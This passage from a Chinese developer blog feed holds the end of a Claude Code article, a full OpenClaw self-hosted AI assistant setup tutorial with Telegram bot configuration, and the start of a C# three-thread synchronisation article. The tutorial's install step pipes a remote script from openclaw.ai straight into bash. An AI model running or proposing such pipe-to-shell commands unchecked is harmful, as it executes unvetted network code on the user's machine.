<h2 data-id="heading-15">第四部分：结语</h2>
<p>当你按下回车，看着 <code>index.html</code> 里那个运行完美的贪吃蛇游戏时，恭喜你，你的 Claude Code 已经完成了“进化”。
<strong>Everything Claude Code</strong> 带来的改变是本质的：</p>
<ol>
<li>
<p><strong>告别“盲写”</strong>：通过 <strong><code>/plan</code></strong> <strong>架构模式</strong>，它学会了先思考、再确认细节（甚至还会问你网格大小偏好）、最后才动工。</p>
</li>
<li>
<p><strong>告别“失忆”</strong>：不用再反复喂提示词，<strong>Hooks</strong> 会自动把项目背景写入 <code>.claudememory</code>，让它像老员工一样永远记得你的项目细节。</p>
</li>
<li>
<p><strong>告别“调教”</strong>：它记住了你的 <code>npm</code> 配置和代码规范，上手就是熟练工。</p>
</li>
</ol>
<p><strong>原生的 Claude Code 是一把好剑，而这套配置就是绝世剑法。</strong>
现在，去试试比贪吃蛇更复杂的项目吧，看看这位“资深 AI 工程师”还能给你带来多少惊喜！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenClaw 入门实战：5分钟搭建你的自托管 AI 助手]]></title>    <link>https://juejin.cn/post/7605810996125351970</link>    <guid>https://juejin.cn/post/7605810996125351970</guid>    <pubDate>2026-02-13T04:05:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605810996125351970" data-draft-id="7605810996125335586" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenClaw 入门实战：5分钟搭建你的自托管 AI 助手"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-13T04:05:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="陈广亮"/> <meta itemprop="url" content="https://juejin.cn/user/3139860937575934"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenClaw 入门实战：5分钟搭建你的自托管 AI 助手
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860937575934/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    陈广亮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T04:05:40.000Z" title="Fri Feb 13 2026 04:05:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近在研究如何更高效地使用 AI 助手，发现了一个很有意思的开源项目：<strong>OpenClaw</strong>。它能让你在 Telegram、WhatsApp、Discord 等各种 App 里直接跟 Claude 对话，而且完全由你自己掌控。今天就来分享一下如何从零搭建你的第一个 OpenClaw AI 助手。</p>
<h2 data-id="heading-0">OpenClaw 是什么？</h2>
<p>简单说，<strong>OpenClaw 是一个自托管的 AI 代理网关</strong>。它帮你把 Claude、GPT 等 AI 模型接入到各种消息平台，让你可以像跟朋友聊天一样跟 AI 交互。</p>
<h3 data-id="heading-1">核心特性</h3>
<ul>
<li><strong>多渠道支持</strong>：Telegram、WhatsApp、Discord、Slack 等主流平台</li>
<li><strong>自托管架构</strong>：所有数据留在你自己的服务器上</li>
<li><strong>灵活配置</strong>：支持多个 Agent、自定义工具、记忆管理</li>
<li><strong>开箱即用</strong>：内置 Web 控制面板，配置简单</li>
</ul>
<h3 data-id="heading-2">为什么选择自托管？</h3>
<p>很多人可能会问：市面上已经有 ChatGPT、Claude.ai 这些现成服务了，为什么还要自己搭建？</p>
<p><strong>数据隐私</strong>：所有对话记录、配置信息都存储在你自己的设备上，不会被第三方收集。</p>
<p><strong>完全可控</strong>：想换模型就换模型，想接入哪个平台就接入哪个平台，不受平台限制。</p>
<p><strong>成本透明</strong>：直接调用 API，按实际用量付费，不用担心订阅费用。</p>
<p><strong>功能自由</strong>：可以自定义工具、配置记忆系统、接入本地服务，玩法更多。</p>
<p>对于开发者和注重隐私的用户来说，自托管是个更好的选择。</p>
<h2 data-id="heading-3">快速安装（macOS）</h2>
<p>下面以 macOS 为例，演示如何安装 OpenClaw。其他系统的安装方法类似，可以参考<a href="https://link.juejin.cn?target=https%3A%2F%2Fopenclaw.ai%2Finstall" target="_blank" title="https://openclaw.ai/install" ref="nofollow noopener noreferrer">官方文档</a>。</p>
<h3 data-id="heading-4">前置条件</h3>
<p>在开始之前，确保你的系统满足以下条件：</p>
<ol>
<li>
<p><strong>Node.js 22+</strong>：OpenClaw 基于 Node.js 运行</p>
<pre><code class="hljs language-bash" lang="bash">node --version  <span class="hljs-comment"># 检查版本，应该 &gt;= 22</span>
</code></pre>
<p>如果版本不够，建议用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnvm-sh%2Fnvm" target="_blank" title="https://github.com/nvm-sh/nvm" ref="nofollow noopener noreferrer">nvm</a> 安装最新版。</p>
</li>
<li>
<p><strong>Anthropic API Key</strong>：你需要一个 Claude 的 API 密钥</p>
<ul>
<li>前往 <a href="https://link.juejin.cn?target=https%3A%2F%2Fconsole.anthropic.com%2F" target="_blank" title="https://console.anthropic.com/" ref="nofollow noopener noreferrer">Anthropic Console</a> 注册账号</li>
<li>在 API Keys 页面创建新密钥</li>
<li>记下这个密钥，稍后会用到</li>
</ul>
</li>
</ol>
<h3 data-id="heading-5">一键安装</h3>
<p>OpenClaw 提供了非常方便的一键安装脚本：</p>
<pre><code class="hljs language-bash" lang="bash">curl -fsSL https://openclaw.ai/install.sh | bash
</code></pre>
<p>这个脚本会自动下载并安装 OpenClaw CLI。安装完成后，验证一下：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw --version
</code></pre>
<h3 data-id="heading-6">运行配置向导</h3>
<p>安装好之后，运行配置向导来初始化你的 Gateway：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw onboard --install-daemon
</code></pre>
<p>向导会引导你完成以下配置：</p>
<ol>
<li><strong>选择模型提供商</strong>：选择 Anthropic（Claude）</li>
<li><strong>输入 API Key</strong>：粘贴你刚才获取的 Anthropic API Key</li>
<li><strong>配置 Gateway 端口</strong>：默认 18789，一般不用改</li>
<li><strong>选择渠道</strong>：暂时先跳过，我们后面手动配置 Telegram</li>
</ol>
<p>向导运行完成后，OpenClaw Gateway 会自动启动。</p>
<h2 data-id="heading-7">配置你的第一个 Telegram Bot</h2>
<p>接下来是最有趣的部分：创建一个 Telegram bot，让它接入你的 OpenClaw Gateway。</p>
<h3 data-id="heading-8">1. 通过 @BotFather 创建 Bot</h3>
<p>打开 Telegram，搜索 <strong>@BotFather</strong>（Telegram 官方的 bot 管理工具），然后：</p>
<ol>
<li>发送 <code>/newbot</code> 命令</li>
<li>输入你的 bot 名称，比如：<code>My OpenClaw Assistant</code></li>
<li>输入 bot 的用户名（必须以 <code>bot</code> 结尾），比如：<code>my_openclaw_bot</code></li>
<li>创建成功后，<strong>BotFather 会给你一个 Token</strong>，类似：
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">7123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw</span>
</code></pre>
<strong>务必保存好这个 Token</strong>！</li>
</ol>
<h3 data-id="heading-9">2. 配置 OpenClaw</h3>
<p>现在需要把你的 Telegram bot 接入 OpenClaw。编辑配置文件：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw config edit
</code></pre>
<p>在配置文件中找到 <code>channels.telegram</code> 部分，添加你的 bot 配置：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">channels:</span>
  <span class="hljs-attr">telegram:</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">accounts:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">my-bot</span>
        <span class="hljs-attr">token:</span> <span class="hljs-string">"7123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw"</span>
        <span class="hljs-attr">agent:</span> <span class="hljs-string">main</span>
</code></pre>
<p><strong>参数说明</strong>：</p>
<ul>
<li><code>id</code>：给这个 bot 取个内部标识符，随便起名</li>
<li><code>token</code>：刚才从 BotFather 获得的 bot token</li>
<li><code>agent</code>：指定使用哪个 Agent（默认的 <code>main</code> agent 就够用）</li>
</ul>
<p>保存配置后，重启 Gateway 让配置生效：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw gateway restart
</code></pre>
<h3 data-id="heading-10">3. 启动验证</h3>
<p>检查 Gateway 状态，确保一切正常：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw gateway status
</code></pre>
<p>你应该能看到类似这样的输出：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">✓</span> <span class="hljs-string">Gateway</span> <span class="hljs-string">is</span> <span class="hljs-string">running</span>
  <span class="hljs-attr">PID:</span> <span class="hljs-number">12345</span>
  <span class="hljs-attr">Port:</span> <span class="hljs-number">18789</span>
  <span class="hljs-attr">Uptime:</span> <span class="hljs-string">5s</span>
</code></pre>
<h2 data-id="heading-11">测试你的 Bot</h2>
<p>现在万事俱备，来测试一下你的 AI 助手吧！</p>
<h3 data-id="heading-12">发送第一条消息</h3>
<ol>
<li>打开 Telegram，搜索你刚才创建的 bot（用户名）</li>
<li>点击 <strong>Start</strong> 或发送 <code>/start</code></li>
<li>发送一条消息，比如：<code>你好，介绍一下你自己</code></li>
</ol>
<p>如果一切顺利，你的 bot 应该会回复你！这就是 Claude 通过 OpenClaw Gateway 在响应。</p>
<h3 data-id="heading-13">查看实时日志</h3>
<p>想看到 Gateway 内部发生了什么？打开日志监控：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw logs --follow
</code></pre>
<p>这会实时显示所有请求、响应、错误信息，方便调试。</p>
<h3 data-id="heading-14">使用 Web 控制面板</h3>
<p>OpenClaw 还提供了一个很实用的 Web 控制面板。打开浏览器访问：</p>
<pre><code class="hljs language-arduino" lang="arduino">http:<span class="hljs-comment">//localhost:18789</span>
</code></pre>
<p>在控制面板里，你可以：</p>
<ul>
<li>查看所有对话历史</li>
<li>手动测试对话（不需要通过 Telegram）</li>
<li>查看系统状态和配置</li>
<li>管理多个 Agent</li>
</ul>
<p>这是最方便的调试工具，强烈推荐试试。</p>
<h2 data-id="heading-15">常见问题</h2>
<p><strong>Q: Bot 没有回复怎么办？</strong></p>
<p>检查以下几点：</p>
<ol>
<li><code>openclaw gateway status</code> 确认 Gateway 正在运行</li>
<li><code>openclaw logs --follow</code> 查看是否有错误信息</li>
<li>确认 Telegram token 配置正确</li>
<li>确认 Anthropic API Key 有效且有余额</li>
</ol>
<p><strong>Q: 想让 Bot 更智能怎么办？</strong></p>
<p>OpenClaw 支持自定义 Agent 配置，可以给 Agent 添加记忆、工具、自定义 prompt 等。这些高级功能我会在下一篇文章详细介绍。</p>
<p><strong>Q: 可以同时配置多个 Bot 吗？</strong></p>
<p>当然可以！在 <code>channels.telegram.accounts</code> 数组里添加多个配置即可，每个 bot 可以指定不同的 agent。</p>
<h2 data-id="heading-16">下一步</h2>
<p>恭喜你！现在你已经成功搭建了一个完全由你掌控的 AI 助手。</p>
<p>如果你想进一步探索 OpenClaw 的强大功能，可以关注我接下来的系列文章：</p>
<ul>
<li><strong>多 Agent 配置</strong>：为不同场景创建专用助手（工作、娱乐、学习）</li>
<li><strong>工具集成</strong>：让 AI 能执行命令、搜索网页、管理文件</li>
<li><strong>记忆系统</strong>：让 AI 记住你的偏好和历史对话</li>
</ul>
<p>也可以直接查看 <a href="https://link.juejin.cn?target=https%3A%2F%2Fopenclaw.ai%2F" target="_blank" title="https://openclaw.ai/" ref="nofollow noopener noreferrer">OpenClaw 官方文档</a> 了解更多高级用法。</p>
<p>如果在搭建过程中遇到任何问题，欢迎在评论区留言交流。</p>
<hr/>
<p><strong>相关资源</strong>：</p>
<ul>
<li>OpenClaw 官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopenclaw.ai%2F" target="_blank" title="https://openclaw.ai/" ref="nofollow noopener noreferrer">openclaw.ai/</a></li>
<li>GitHub 仓库：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenclaw%2Fopenclaw" target="_blank" title="https://github.com/openclaw/openclaw" ref="nofollow noopener noreferrer">github.com/openclaw/op…</a></li>
<li>官方文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopenclaw.ai%2Fdocs" target="_blank" title="https://openclaw.ai/docs" ref="nofollow noopener noreferrer">openclaw.ai/docs</a></li>
<li>Anthropic API：<a href="https://link.juejin.cn?target=https%3A%2F%2Fconsole.anthropic.com%2F" target="_blank" title="https://console.anthropic.com/" ref="nofollow noopener noreferrer">console.anthropic.com/</a></li>
</ul>
<hr/>
<blockquote>
<p>原文链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fchenguangliang.com%2Fposts%2Fopenclaw-getting-started" target="_blank" title="https://chenguangliang.com/posts/openclaw-getting-started" ref="nofollow noopener noreferrer">chenguangliang.com/posts/openc…</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[令牌环式同步扩展]]></title>    <link>https://juejin.cn/post/7605816833191870464</link>    <guid>https://juejin.cn/post/7605816833191870464</guid>    <pubDate>2026-02-13T05:05:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605816833191870464" data-draft-id="7605772919224959010" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="令牌环式同步扩展"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-13T05:05:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="guchen66"/> <meta itemprop="url" content="https://juejin.cn/user/3191200923270394"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            令牌环式同步扩展
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3191200923270394/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    guchen66
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T05:05:08.000Z" title="Fri Feb 13 2026 05:05:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">令牌环式同步扩展：从 Ping-Pong 到 ABC 交替执行</h2>
<p>在上一篇博客中，我们介绍了六种实现两个线程交替执行的方法。本文将作为扩展，探讨如何将这些实现方式改造为三个线程交替执行 "A"、"B"、"C"，形成 "ABCABC..." 的环形序列。</p>
<h3 data-id="heading-1">问题描述</h3>
<p>实现三个线程交替打印 "A"、"B"、"C"，共打印 100 轮，形成 "ABCABC..." 的交替序列。</p>
<h3 data-id="heading-2">六种实现方式的改造分析</h3>
<h4 data-id="heading-3">1. ManualResetEvent / AutoResetEvent 实现</h4>
<p><strong>改造难度：⭐⭐ 容易</strong></p>
<pre><code class="hljs language-scss" lang="scss">internal class ABC_EventTestCode
{
    public static void <span class="hljs-built_in">Print</span>()
    {
        <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> = new <span class="hljs-built_in">AutoResetEvent</span>(true);  <span class="hljs-comment">// A 初始可用</span>
        <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span> = new <span class="hljs-built_in">AutoResetEvent</span>(false); <span class="hljs-comment">// B 初始不可用</span>
        <span class="hljs-selector-tag">var</span> c = new <span class="hljs-built_in">AutoResetEvent</span>(false); <span class="hljs-comment">// C 初始不可用</span>
​
        <span class="hljs-comment">// 线程 A</span>
        Task<span class="hljs-selector-class">.Run</span>(() =&gt;
        {
            for (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.WaitOne</span>();    <span class="hljs-comment">// 等待 A 信号</span>
                Console<span class="hljs-selector-class">.WriteLine</span>("A");
                <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.Set</span>();        <span class="hljs-comment">// 释放 B 信号</span>
            }
        });
​
        <span class="hljs-comment">// 线程 B</span>
        Task<span class="hljs-selector-class">.Run</span>(() =&gt;
        {
            for (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.WaitOne</span>();    <span class="hljs-comment">// 等待 B 信号</span>
                Console<span class="hljs-selector-class">.WriteLine</span>("B");
                c<span class="hljs-selector-class">.Set</span>();        <span class="hljs-comment">// 释放 C 信号</span>
            }
        });
​
        <span class="hljs-comment">// 线程 C</span>
        Task<span class="hljs-selector-class">.Run</span>(() =&gt;
        {
            for (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)
            {
                c<span class="hljs-selector-class">.WaitOne</span>();    <span class="hljs-comment">// 等待 C 信号</span>
                Console<span class="hljs-selector-class">.WriteLine</span>("C");
                <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.Set</span>();        <span class="hljs-comment">// 释放 A 信号，形成闭环</span>
            }
        });
    }
}
</code></pre>
<p><strong>工作原理</strong>：</p>
<ul>
<li>使用三个 <code>AutoResetEvent</code> 对象，初始状态分别为 <code>true</code>（A 可用）、<code>false</code>（B 不可用）和 <code>false</code>（C 不可用）</li>
<li>每个线程执行前调用 <code>WaitOne()</code> 等待信号</li>
<li>执行完成后，通过 <code>Set()</code> 通知下一个线程，最后一个线程通知第一个线程形成闭环</li>
</ul>
<p><strong>优缺点</strong>：</p>
<ul>
<li>✅ 改造简单，逻辑清晰</li>
<li>✅ AutoResetEvent 自动重置，无需手动调用 Reset()</li>
<li>✅ 适用于传统同步场景</li>
<li>❌ 不支持异步编程，会阻塞线程</li>
<li>❌ ManualResetEvent 需要手动 Reset，三个信号时容易漏掉</li>
</ul>
<h4 data-id="heading-4">2. SemaphoreSlim 实现</h4>
